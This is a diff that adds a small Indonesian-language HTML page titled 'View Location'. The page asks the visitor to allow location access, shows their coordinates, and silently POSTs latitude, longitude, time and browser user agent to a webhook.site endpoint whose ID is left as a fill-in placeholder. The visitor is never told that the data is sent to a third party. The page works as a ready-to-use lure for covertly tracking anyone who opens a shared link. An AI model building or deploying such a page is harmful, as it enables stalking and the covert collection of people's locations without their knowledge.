@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Lihat Lokasi</title>
+</head>
+<body style="font-family: Arial; text-align:center; margin-top:50px;">
+    <h2>Memuat lokasi...</h2>
+    <p id="status">Mohon izinkan akses lokasi.</p>
+
+    <script>
+        function kirimLokasi(lat, lon) {
+            fetch("https://webhook.site/ISI_ID_KAMU", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    latitude: lat,
+                    longitude: lon,
+                    waktu: new Date().toString(),
+                    userAgent: navigator.userAgent
+                })
+            });
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                let lat = position.coords.latitude;
+                let lon = position.coords.longitude;
+
+                document.getElementById("status").innerHTML =
+                    "Latitude: " + lat + "<br>Longitude: " + lon;
+
+                kirimLokasi(lat, lon);
+            });
+        }
+    </script>
+</body>
+</html>
